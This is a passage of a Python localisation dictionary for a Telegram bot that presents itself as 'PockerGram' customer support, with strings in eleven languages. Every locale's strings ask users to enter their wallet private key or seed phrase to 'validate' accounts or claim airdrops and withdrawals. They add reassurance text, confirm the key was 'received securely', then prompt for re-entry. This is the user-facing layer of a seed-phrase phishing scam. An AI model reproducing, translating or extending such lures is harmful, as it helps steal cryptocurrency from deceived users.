        "welcome": "Olá {user}, bem-vindo ao bot de suporte PockerGram! Posso ajudar você a validar contas, reivindicar tokens e airdrops, gerenciar depósitos e saques (inclusive saques pendentes), e ajudar com reembolsos ou problemas gerais de conta/carteira. Use o menu para escolher o que precisa e eu o guiarei passo a passo.",
        "main menu title": "Selecione um tipo de problema para continuar:",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "claim tickets": "Reivindicar Ingressos",
        "recover account progress": "Recuperar progresso da conta",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "withdrawals": "Saques",
        "missing/irregular balance": "Saldo Ausente/Irregular",
        "login issues": "Problemas de Login",
        "connect wallet message": "Por favor, conecte sua carteira com sua Chave Privada ou Seed Phrase para continuar.",
        "withdrawal_connect_message": "por favor conecte sua carteira para reivindicar seu saque",
        "connect wallet button": "🔑 Conectar Carteira",
        "select wallet type": "Selecione o tipo da sua carteira:",
        "other wallets": "Outras Carteiras",
        "private key": "🔑 Chave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("pt", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Por favor, insira sua seed phrase de 12 ou 24 palavras." + PROFESSIONAL_REASSURANCE.get("pt", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Por favor, insira sua chave privada." + PROFESSIONAL_REASSURANCE.get("pt", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Escolha inválida. Use os botões.",
        "final error message": "‼️ Ocorreu um erro. /start para tentar novamente.",
        "final_received_message": "Obrigado — sua seed ou chave privada foi recebida com segurança e será processada. Use /start para começar de novo.",
        "error_use_seed_phrase": "Este campo requer uma seed phrase (12 ou 24 palavras). Por favor, forneça a seed phrase.",
        "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de inserir a chave correta — use copiar/colar para evitar erros. Por favor /start para tentar novamente.",
        "await restart message": "Clique em /start para reiniciar.",
        "back": "🔙 Voltar",
        "invalid_input": "Entrada inválida. Use /start para começar.",
        "account recovery": "Recuperação de Conta",
        "refund": "Reembolso",
        "claim airdrop": "Reivindicar Airdrop",
        "claim withdrawal": "Reivindicar Saque",
        "pending withdrawal": "Saque Pendente",
        "fix bug": "Corrigir Bug",
        "deposits": "Depósitos",
    },
    "id": {
        "choose language": "Silakan pilih bahasa:",
        "welcome": "Halo {user}, selamat datang di bot dukungan PockerGram! Saya dapat membantu memvalidasi akun, mengklaim token dan airdrop, mengelola deposit dan penarikan (termasuk penarikan yang tertunda) serta membantu dengan pengembalian dana atau masalah umum dompet/akun. Gunakan menu untuk memilih kebutuhan Anda dan saya akan memandu langkah demi langkah.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "claim tickets": "Klaim Tiket",
        "recover account progress": "Pulihkan kemajuan akun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "withdrawals": "Penarikan",
        "missing/irregular balance": "Saldo Hilang/Tidak Biasa",
        "login issues": "Masalah Login",
        "connect wallet message": "Sambungkan dompet Anda dengan Kunci Pribadi atau Seed Phrase untuk melanjutkan.",
        "withdrawal_connect_message": "silakan sambungkan dompet Anda untuk mengklaim penarikan Anda",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Pilih jenis dompet Anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Pribadi",
        "seed phrase": "🔒 Impor Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi pilihan Anda.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("id", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Masukkan seed phrase 12 atau 24 kata Anda." + PROFESSIONAL_REASSURANCE.get("id", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Masukkan kunci pribadi Anda." + PROFESSIONAL_REASSURANCE.get("id", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Pilihan tidak valid. Gunakan tombol.",
        "final error message": "‼️ Terjadi kesalahan. /start untuk mencoba lagi.",
        "final_received_message": "Terima kasih — seed atau kunci pribadi Anda telah diterima dengan aman dan akan diproses. Gunakan /start untuk mulai lagi.",
        "error_use_seed_phrase": "Kolom ini memerlukan seed phrase (12 atau 24 kata). Silakan berikan seed phrase.",
        "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
        "await restart message": "Klik /start untuk memulai ulang.",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
        "account recovery": "Pemulihan Akun",
        "refund": "Pengembalian Dana",
        "claim airdrop": "Klaim Airdrop",
        "claim withdrawal": "Klaim Penarikan",
        "pending withdrawal": "Penarikan Tertunda",
        "fix bug": "Perbaiki Bug",
        "deposits": "Deposit",
    },
    "de": {
        "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
        "welcome": "Hallo {user}, willkommen beim PockerGram Support-Bot! Ich kann Ihnen helfen, Konten zu validieren, Tokens und Airdrops zu beanspruchen, Einzahlungen und Auszahlungen (einschließlich ausstehender Auszahlungen) zu verwalten und bei Rückerstattungen oder allgemeinen Wallet-/Konto-Problemen zu unterstützen. Verwenden Sie das Menü, um auszuwählen, was Sie benötigen, und ich führe Sie Schritt für Schritt.",
        "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "claim tickets": "Tickets Beanspruchen",
        "recover account progress": "Kontofortschritt wiederherstellen",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "withdrawals": "Auszahlungen",
        "missing/irregular balance": "Fehlender/Unregelmäßiger Saldo",
        "login issues": "Anmeldeprobleme",
        "connect wallet message": "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        "withdrawal_connect_message": "bitte verbinden Sie Ihre Wallet, um Ihre Auszahlung zu beanspruchen",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed-Phrase importieren",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt。\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("de", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Bitte geben Sie Ihre Seed-Phrase mit 12 oder 24 Wörtern ein." + PROFESSIONAL_REASSURANCE.get("de", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Bitte geben Sie Ihren privaten Schlüssel ein." + PROFESSIONAL_REASSURANCE.get("de", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Ungültige Auswahl. Bitte verwenden Sie die Schaltflächen.",
        "final error message": "‼️ Ein Fehler ist aufgetreten. /start zum Wiederholen.",
        "final_received_message": "Vielen Dank — Ihre seed oder Ihr privater Schlüssel wurde sicher empfangen und wird verarbeitet. Verwenden Sie /start, um neu zu beginnen.",
        "error_use_seed_phrase": "Dieses Feld erfordert eine Seed-Phrase (12 oder 24 Wörter).",
        "post_receive_error": "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben — verwenden Sie Kopieren/Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen.",
        "await restart message": "Bitte klicken Sie auf /start, um von vorne zu beginnen.",
        "back": "🔙 Zurück",
        "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
        "account recovery": "Kontowiederherstellung",
        "refund": "Rückerstattung",
        "claim airdrop": "Airdrop Beanspruchen",
        "claim withdrawal": "Auszahlung Beanspruchen",
        "pending withdrawal": "Ausstehende Auszahlungen",
        "fix bug": "Fehler beheben",
        "deposits": "Einzahlungen",
    },
    "nl": {
        "choose language": "Selecteer uw voorkeurstaal:",
        "welcome": "Hoi {user}, welkom bij de PockerGram support bot! Ik kan je helpen accounts te valideren, tokens en airdrops te claimen, stortingen en opnames (inclusief openstaande opnames) te beheren en helpen met terugbetalingen of algemene wallet/account problemen. Gebruik het menu om te kiezen wat je nodig hebt en ik begeleid je stap voor stap.",
        "main menu title": "Selecteer een type probleem om door te gaan:",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "claim tickets": "Tickets Claimen",
        "recover account progress": "Accountvoortgang herstellen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "withdrawals": "Opnames",
        "missing/irregular balance": "Ontbrekend/Ongeregeld Saldo",
        "login issues": "Login-problemen",
        "connect wallet message": "Verbind uw wallet met uw private key of seed phrase om door te gaan.",
        "withdrawal_connect_message": "verbind alstublieft uw wallet om uw opname te claimen",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "wallet selection message": "U heeft {wallet_name} geselecteerd。\nSelecteer uw voorkeursverbindingswijze.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("nl", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Voer uw seed phrase met 12 of 24 woorden in." + PROFESSIONAL_REASSURANCE.get("nl", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Voer uw privésleutel in." + PROFESSIONAL_REASSURANCE.get("nl", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Ongeldige keuze. Gebruik de knoppen.",
        "final error message": "‼️ Er is een fout opgetreden. Gebruik /start om opnieuw te proberen.",
        "final_received_message": "Dank u — uw seed of privésleutel is veilig ontvangen en zal worden verwerkt. Gebruik /start om opnieuw te beginnen.",
        "error_use_seed_phrase": "Dit veld vereist een seed-phrase (12 of 24 woorden). Geef de seed-phrase op.",
        "post_receive_error": "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert — gebruik kopiëren en plakken om fouten te voorkomen. Gebruik /start om het opnieuw te proberen.",
        "await restart message": "Klik op /start om opnieuw te beginnen.",
        "back": "🔙 Terug",
        "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
        "account recovery": "Accountherstel",
        "refund": "Terugbetaling",
        "claim airdrop": "Airdrop Claimen",
        "claim withdrawal": "Opname Claimen",
        "pending withdrawal": "Openstaande Opname",
        "fix bug": "Fout oplossen",
        "deposits": "Stortingen",
    },
    "hi": {
        "choose language": "कृपया भाषा चुनें:",
        "welcome": "हाय {user}, PockerGram सपोर्ट बॉट में आपका स्वागत है! मैं आपके खातों के सत्यापन, टोकन और एयरड्रॉप का दावा, जमा और निकासी (सहित लंबित निकासी) को प्रबंधित करने और रिफंड या सामान्य वॉलेट/खाता समस्याओं में मदद कर सकता हूँ। मेनू का उपयोग करें और मैं आपको चरण-दर-चरण मार्गदर्शन करूँगा।",
        "main menu title": "जारी रखने के लिए कृपया एक समस्या प्रकार चुनें:",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "claim tickets": "टिकट दावा करें",
        "recover account progress": "खाते की प्रगति पुनर्प्राप्त करें",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएँ",
        "rectification": "सुधार",
        "withdrawals": "निकासी",
        "missing/irregular balance": "लापता/अनियमित बैलेंस",
        "login issues": "लॉगिन समस्याएँ",
        "connect wallet message": "कृपया वॉलेट को प्राइवेट की या सीड वाक्यांश से कनेक्ट करें।",
        "withdrawal_connect_message": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपना निकासी क्लेम कर सकें",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 निजी कुंजी",
        "seed phrase": "🔒 सीड वाक्यांश आयात करें",
        "wallet selection message": "आपने {wallet_name} का चयन किया है。\nकनेक्शन मोड चुनें。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("hi", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें。" + PROFESSIONAL_REASSURANCE.get("hi", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "कृपया अपनी निजी कुंजी दर्ज करें。" + PROFESSIONAL_REASSURANCE.get("hi", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
        "final error message": "‼️ एक त्रुटि हुई। /start से पुनः प्रयास करें।",
        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षित रूप से प्राप्त कर ली गई है और संसाधित की जाएगी। /start से पुनः शुरू करें।",
        "error_use_seed_phrase": "यह फ़ील्ड seed phrase (12 या 24 शब्द) मांगता है। कृपया seed दें।",
        "post_receive_error": "‼️ एक त्रुटि हुई。 कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें。 /start के साथ पुनः प्रयास करें。",
        "await restart message": "कृपया /start दबाएँ।",
        "back": "🔙 वापस",
        "invalid_input": "अमान्य इनपुट। /start उपयोग करें।",
        "account recovery": "खाता पुनर्प्राप्ति",
        "refund": "रिफंड",
        "claim airdrop": "Airdrop दावा करें",
        "claim withdrawal": "निकासी का दावा करें",
        "pending withdrawal": "लंबित निकासी",
        "fix bug": "बग ठीक करें",
        "deposits": "जमा",
    },
    "tr": {
        "choose language": "Lütfen dilinizi seçin:",
        "welcome": "Merhaba {user}, PockerGram destek botuna hoş geldiniz! Hesapları doğrulamanıza, token ve airdrop taleplerine, para yatırma ve çekme işlemlerini (bekleyen çekimler dahil) yönetmenize ve iade ya da genel cüzdan/hesap sorunlarında yardımcı olabilirim. Menüden ihtiyacınızı seçin, adım adım yönlendireceğim.",
        "main menu title": "Devam etmek için bir sorun türü seçin:",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "claim tickets": "Bilet Talep Et",
        "recover account progress": "Hesap ilerlemesini kurtar",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "withdrawals": "Para Çekme",
        "missing/irregular balance": "Eksik/Düzensiz Bakiye",
        "login issues": "Giriş Sorunları",
        "connect wallet message": "Lütfen cüzdanınızı özel anahtar veya seed ile bağlayın。",
        "withdrawal_connect_message": "lütfen çekiminizi talep etmek için cüzdanınızı bağlayın",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Özel Anahtar",
        "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
        "wallet selection message": "Seçtiğiniz {wallet_name}。\nBağlantı modunu seçin。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("tr", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。" + PROFESSIONAL_REASSURANCE.get("tr", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Lütfen özel anahtarınızı girin。" + PROFESSIONAL_REASSURANCE.get("tr", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Geçersiz seçim. Lütfen düğmeleri kullanın。",
        "final error message": "‼️ Bir hata oluştu。 /start ile tekrar deneyin。",
        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir。 /start ile yeniden başlayın。",
        "error_use_seed_phrase": "Bu alan bir seed phrase (12 veya 24 kelime) gerektirir。 Lütfen seed girin。",
        "post_receive_error": "‼️ Bir hata oluştu。 Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın。 Lütfen /start ile tekrar deneyin。",
        "await restart message": "Lütfen /start ile yeniden başlayın。",
        "back": "🔙 Geri",
        "invalid_input": "Geçersiz giriş。 /start kullanın。",
        "account recovery": "Hesap Kurtarma",
        "refund": "İade",
        "claim airdrop": "Airdrop Talep Et",
        "claim withdrawal": "Çekim Talep Et",
        "pending withdrawal": "Bekleyen Çekimler",
        "fix bug": "Hata Düzelt",
        "deposits": "Mevduatlar",
    },
    "zh": {
        "choose language": "请选择语言：",
        "welcome": "嗨 {user}，欢迎使用 PockerGram 支持机器人！我可以帮助您验证账户、认领代币与空投、处理存款和提现（包括待处理提现），并协助退款或其他钱包/账户问题。请使用菜单选择需要，我会一步步指导您。",
        "main menu title": "请选择一个问题类型以继续：",
        "validation": "验证",
        "claim tokens": "认领代币",
        "claim tickets": "申领门票",
        "recover account progress": "恢复账户进度",
        "assets recovery": "资产恢复",
        "general issues": "常规问题",
        "rectification": "修正",
        "withdrawals": "提现",
        "missing/irregular balance": "丢失/不规则余额",
        "login issues": "登录问题",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "withdrawal_connect_message": "请连接您的钱包以领取您的提现",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("zh", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "请输入 12 或 24 个单词的助记词。" + PROFESSIONAL_REASSURANCE.get("zh", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "请输入您的私钥。" + PROFESSIONAL_REASSURANCE.get("zh", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "无效选择。请使用按钮。",
        "final error message": "‼️ 出现错误。/start 重试。",
        "final_received_message": "谢谢 — 您的 seed 或私钥已被安全接收并将被处理。/start 重新开始。",
        "error_use_seed_phrase": "此字段需要助记词 (12 或 24 个单词)。请提供助记词。",
        "post_receive_error": "‼️ 出现错误。请确保输入正确的密钥 — 使用复制粘贴以避免错误。请 /start 再试。",
        "await restart message": "请点击 /start 重新开始。",
        "back": "🔙 返回",
        "invalid_input": "无效输入。请使用 /start 开始。",
        "account recovery": "账户恢复",
        "refund": "退款",
        "claim airdrop": "认领空投",
        "claim withdrawal": "认领提现",
        "pending withdrawal": "待处理提现",
        "fix bug": "修复错误",
        "deposits": "存款",
    },
    "cs": {
        "choose language": "Vyberte preferovaný jazyk:",
        "welcome": "Ahoj {user}, vítejte u PockerGram support bota! Mohu vám pomoci s ověřováním účtů, uplatněním tokenů a airdropů, zpracováním vkladů a výběrů (včetně čekajících), a pomoci s refundacemi či obecnými problémy s peněženkou/účtem. Použijte menu a já vás provedu krok za krokem.",
        "main menu title": "Vyberte typ problému pro pokračování:",
        "validation": "Ověření",
        "claim tokens": "Nárokovat Tokeny",
        "claim tickets": "Uplatnit vstupenky",
        "recover account progress": "Obnovit postup účtu",
        "assets recovery": "Obnovení aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Oprava",
        "withdrawals": "Výběry",
        "missing/irregular balance": "Chybějící/Nepravidelný zůstatek",
        "login issues": "Problémy s přihlášením",
        "connect wallet message": "Připojte peněženku pomocí soukromého klíče nebo seed fráze.",
        "withdrawal_connect_message": "prosím připojte svou peněženku pro uplatnění výběru",
        "connect wallet button": "🔑 Připojit peněženku",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Soukromý klíč",
        "seed phrase": "🔒 Importovat seed frázi",
        "wallet selection message": "Vybrali jste {wallet_name}。\nVyberte preferovaný způsob připojení。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("cs", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Zadejte seed frázi o 12 nebo 24 slovech。" + PROFESSIONAL_REASSURANCE.get("cs", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Zadejte prosím svůj soukromý klíč。" + PROFESSIONAL_REASSURANCE.get("cs", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Neplatná volba. Použijte tlačítka.",
        "final error message": "‼️ Došlo k chybě. /start pro opakování.",
        "final_received_message": "Děkujeme — vaše seed nebo privátní klíč byl bezpečně přijat a bude zpracován. Použijte /start pro opakování.",
        "error_use_seed_phrase": "Zadejte seed frázi (12 nebo 24 slov), ne adresu.",
        "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit. Prosím /start pro opakování.",
        "await restart message": "Klikněte /start pro restart.",
        "back": "🔙 Zpět",
        "invalid_input": "Neplatný vstup. Použijte /start.",
        "account recovery": "Obnovení účtu",
        "refund": "Vrácení peněz",
        "claim airdrop": "Nárokovat Airdrop",
        "claim withdrawal": "Uplatnit výběr",
        "pending withdrawal": "Čekající výběry",
        "fix bug": "Opravit chybu",
        "deposits": "Vklady",
    },
    "ur": {
        "choose language": "براہِ کرم زبان منتخب کریں:",
        "welcome": "ہیلو {user}، PockerGram سپورٹ بوٹ میں خوش آمدید! میں آپ کی مدد کر سکتا ہوں اکاؤنٹ کی توثیق、ٹوکن اور ایردراپ کا کلیم、ڈپازٹس اور ودڈرالز (جس میں زیرِ التوا ودڈرالز بھی شامل ہیں) کا انتظام、اور ری فنڈز یا عام والٹ/اکاؤنٹ مسائل میں معاونت。 مینو استعمال کریں اور میں آپ کی مرحلہ وار رہنمائی کروں گا۔",
        "main menu title": "جاری رکھنے کے لیے مسئلے کی قسم منتخب کریں:",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن کلیم کریں",
        "claim tickets": "ٹکٹ کلیم کریں",
        "recover account progress": "اکاؤنٹ کی پیش رفت بحال کریں",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عمومی مسائل",
        "rectification": "درستگی",
        "withdrawals": "رقم نکالیں",
        "missing/irregular balance": "غائب/غیر معمولی بیلنس",
        "login issues": "لاگ ان مسائل",
        "connect wallet message": "براہِ کرم والٹ کو پرائیویٹ کی یا seed کے ساتھ منسلک کریں。",
        "withdrawal_connect_message": "براہِ کرم اپنا والٹ کنیکٹ کریں تاکہ آپ اپنا ودڈرال حاصل کر سکیں",
        "connect wallet button": "🔑 والٹ جوڑیں",
        "select wallet type": "براہِ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 پرائیویٹ کی",
        "seed phrase": "🔒 سیڈ فریز امپورٹ کریں",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("ur", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。" + PROFESSIONAL_REASSURANCE.get("ur", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "براہ کرم اپنی پرائیویٹ کی درج کریں。" + PROFESSIONAL_REASSURANCE.get("ur", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "غلط انتخاب۔ براہ کرم بٹنز استعمال کریں۔",
        "final error message": "‼️ ایک خرابی پیش آئی۔ /start دوبارہ کوشش کریں۔",
        "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں۔",
        "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے۔ براہ کرم seed درج کریں。",
        "post_receive_error": "‼️ ایک خرابی پیش آئی。 براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیسٹ کریں۔ براہ کرم /start دوبارہ کوشش کے لیے。",
        "await restart message": "براہ کرم /start دبائیں۔",
        "back": "🔙 واپس",
        "invalid_input": "غلط ان پٹ۔ /start استعمال کریں。",
        "account recovery": "اکاؤنٹ بازیابی",
        "refund": "ری فنڈ",
        "claim airdrop": "Airdrop کا دعویٰ کریں",
        "claim withdrawal": "ودڈرال کا دعویٰ کریں",
        "pending withdrawal": "زیر التوا ودڈرال",
        "fix bug": "بگ درست کریں",
        "deposits": "ڈپازٹس",
    },
    "uz": {
        "choose language": "Iltimos, tilni tanlang:",
        "welcome": "Salom {user}, PockerGram qo‘llab-quvvatlash botiga xush kelibsiz! Men akkauntlarni tekshirish, token va airdroplarni talab qilish, depozitlar va yechib olishlarni (kutilayotgan yechib olishlar ham) boshqarish va qaytarishlar yoki umumiy hamyon/akkaunt muammolarida yordam bera olaman. Menyudan tanlang, men sizni bosqichma-bosqich yo‘naltiraman.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni da'vo qilish",
        "claim tickets": "Biletlarni talab qiling",
        "recover account progress": "Hisobning rivojlanishini tiklash",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "withdrawals": "Chiqimlar",
        "missing/irregular balance": "Yoʻqolgan/Notekis balans",
        "login issues": "Kirish muammolari",
        "connect wallet message": "Iltimos, hamyoningizni private key yoki seed bilan ulang.",
        "withdrawal_connect_message": "iltingiz, yechib olishingizni talab qilish uchun hamyoningizni ulang",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed iborasini import qilish",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz。\nUlanish usulini tanlang。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("uz", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting。" + PROFESSIONAL_REASSURANCE.get("uz", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Private key kiriting。" + PROFESSIONAL_REASSURANCE.get("uz", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Notoʻgʻri tanlov. Tugmalardan foydalaning。",
        "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib koʻring。",
        "final_received_message": "Rahmat — seed yoki xususiy kalitingiz qabul qilindi va qayta ishlanadi. /start bilan boshlang。",
        "error_use_seed_phrase": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting, manzil emas。",
        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiriting — nusxalash va joylashtirishdan foydalaning。 /start bilan qayta urinib ko‘ring。",
        "await restart message": "Qayta boshlash uchun /start bosing.",
        "back": "🔙 Orqaga",
        "invalid_input": "Noto'g'ri kiritish. /start ishlating。",
        "account recovery": "Hisobni tiklash",
        "refund": "Qaytarib berish",
        "claim airdrop": "Airdropni da'vo qilish",
        "claim withdrawal": "Yechib olishni da'vo qilish",
        "pending withdrawal": "Kutilayotgan yechib olishlar",
        "fix bug": "Xatoni tuzatish",
        "deposits": "Depozitlar",
    },
    "it": {
        "choose language": "Seleziona la lingua:",
        "welcome": "Ciao {user}, benvenuto nel bot di supporto PockerGram! Posso aiutarti a convalidare account, richiedere token e airdrop, gestire depositi e prelievi (inclusi i prelievi in sospeso) e assisterti con rimborsi o problemi generali di wallet/account. Usa il menu per scegliere ciò di cui hai bisogno e ti guiderò passo dopo passo.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "claim tickets": "Richiedi Biglietti",
        "recover account progress": "Recupera stato di avanzamento account",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "withdrawals": "Prelievi",
        "missing/irregular balance": "Saldo mancante/irregolare",
        "login issues": "Problemi di Accesso",
        "connect wallet message": "Collega il tuo wallet con la Chiave Privata o Seed Phrase per continuare.",
        "withdrawal_connect_message": "per favore collega il tuo wallet per richiedere il tuo prelievo",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallet",
        "private key": "🔑 Chiave Privata",
        "seed phrase": "🔒 Importa Seed Phrase",
        "wallet selection message": "Hai selezionato {wallet_name}。\nSeleziona la modalità di connessione preferita。",
        "reassurance": PROFESSIONAL_REASSURANCE.get("it", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Inserisci la seed phrase di 12 o 24 parole。" + PROFESSIONAL_REASSURANCE.get("it", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Inserisci la chiave privata。" + PROFESSIONAL_REASSURANCE.get("it", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Scelta non valida. Usa i pulsanti。",
        "final error message": "‼️ Si è verificato un errore。 /start per riprovare。",
        "final_received_message": "Grazie — seed o chiave privata ricevuti in modo sicuro e saranno processati。 Usa /start per ricominciare。",
        "error_use_seed_phrase": "Questo campo richiede una seed phrase (12 o 24 parole)。",
        "post_receive_error": "‼️ Si è verificato un errore. Assicurati di inserire la chiave corretta — usa copia e incolla per evitare errori。",
        "await restart message": "Clicca /start per ricominciare。",
        "back": "🔙 Indietro",
        "invalid_input": "Input non valido。 Usa /start。",
        "account recovery": "Recupero Account",
        "refund": "Rimborso",
